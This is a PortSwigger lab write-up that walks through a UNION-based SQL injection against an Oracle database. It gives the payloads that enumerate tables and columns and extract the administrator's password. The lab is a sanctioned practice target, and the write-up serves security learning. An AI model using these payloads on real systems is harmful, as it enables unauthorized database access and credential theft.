# SQL Injection Attack — Listing the Database Contents on Oracle

## Lab

**PortSwigger Web Security Academy**

**Lab:** SQL injection attack, listing the database contents on Oracle

## Goal

The goal of this lab was to use SQL injection to discover the structure of an Oracle database, find the table holding user information and its relevant columns, and then retrieve the `administrator` user's password in order to log in.

## 1. Finding the number of columns

First, I tried to determine how many columns the query contains using `ORDER BY`.

The payload I used:

```sql
ORDER BY 2--
```

Based on this test, I determined that the query contains **2 columns**.

## 2. Finding the reflected column

In the next step, I used `UNION SELECT` to test which column was displayed in the application's response.

Since we were working with an Oracle database, I needed to add `FROM dual`:

```sql
UNION SELECT NULL, 'hello' FROM dual--
```

I saw that the value `hello` was displayed in the response.

This told me that **the second column was reflected in the response**, and that I could pull the data I wanted into this column.

## 3. Discovering the tables in the database

My next goal was to find out the table names in the database.

Based on SQL syntax I already knew, I first tried a query like this:

```sql
UNION SELECT table_name FROM database()--
```

But I got an **Internal Server Error**.

Since I wasn't as familiar with Oracle's syntax as I was with PostgreSQL, I asked AI for help at this point. I learned the error had two causes:

1. I needed to match the number of columns in the `UNION SELECT` query with the original query.
2. Instead of the `database()` approach, I needed to use Oracle's system catalogs.

I then changed the query as follows:

```sql
UNION SELECT NULL, table_name FROM all_tables--
```

The query ran successfully, and I was able to view the tables in the database.

Alongside various system tables created by Oracle, the list also contained tables belonging to the application.

After reviewing them, I identified the table holding user information as:

```text
USERS_ZTFWDK
```

> **Note:** Since table and column names can vary across PortSwigger lab instances, the names here belong to the specific instance used in this writeup.

## 4. Discovering the column names

Now I needed to find out which columns the `USERS_ZTFWDK` table had.

I first tried the following query:

```sql
UNION SELECT NULL, column_name FROM all_columns--
```

But I got an **Internal Server Error** again.

Since I didn't have enough knowledge of Oracle's system views, I asked AI for help again. I learned that instead of `all_columns`, `all_tab_columns` could be used to view table columns in Oracle.

The corrected query:

```sql
UNION SELECT NULL, column_name FROM all_tab_columns--
```

This query worked, and I was able to view the column names.

I then narrowed the results down to only the `USERS_ZTFWDK` table:

```sql
UNION SELECT NULL, column_name
FROM all_tab_columns
WHERE table_name = 'USERS_ZTFWDK'--
```

I saw that there were three columns in the response:

```text
EMAIL
PASSWORD_CZVKEX
USERNAME_VWKVEW
```

The columns we needed were:

```text
USERNAME_VWKVEW
PASSWORD_CZVKEX
```

## 5. Extracting the administrator's password

In the final step, I needed to retrieve the `administrator` user's password.

For this, I used the following payload:

```sql
UNION SELECT NULL, PASSWORD_CZVKEX
FROM USERS_ZTFWDK
WHERE USERNAME_VWKVEW = 'administrator'--
```

The `administrator` user's password was displayed in the response.

I used the password to log in through the login page, and the **lab was completed successfully.**

## Attack chain

My solving process was, in summary, as follows:

```text
ORDER BY 2
    ↓
Determine there are 2 columns
    ↓
UNION SELECT NULL, 'hello' FROM dual
    ↓
Determine the 2nd column is reflected
    ↓
all_tables
    ↓
Find the USERS_ZTFWDK table
    ↓
all_tab_columns
    ↓
Find the USERS_ZTFWDK columns
    ↓
USERNAME_VWKVEW + PASSWORD_CZVKEX
    ↓
Filter for the administrator user
    ↓
Extract the password
    ↓
Login
```

## What I learned

In this lab, I specifically reinforced the following topics:

* Using `DUAL` in Oracle databases
* The need for matching column counts during `UNION SELECT`
* Determining which column of the application is reflected in the response
* Discovering table names using Oracle's `ALL_TABLES` system view
* Discovering table columns using `ALL_TAB_COLUMNS`
* Pulling data for a specific user with a `WHERE` condition
* That SQL syntax can vary across different DBMS
* The importance of investigating the cause of an error when I'm not familiar with a database's syntax

## AI Usage

**AI was used** in this lab, but rather than providing the solution directly, it was used to understand Oracle-specific syntax issues.

First, I asked why the `database()` usage wasn't working and how table names could be discovered in Oracle. This is how I learned about using `ALL_TABLES`.

I then looked into why the `all_columns` query wasn't working, and learned that the `ALL_TAB_COLUMNS` view could be used in Oracle.

I carried out the SQL injection methodology myself: determining the number of columns, finding the reflected column, selecting the right table, identifying the relevant columns, and constructing the final query.

In this lab, I mainly used AI to **learn the points I was missing regarding Oracle-specific syntax**.
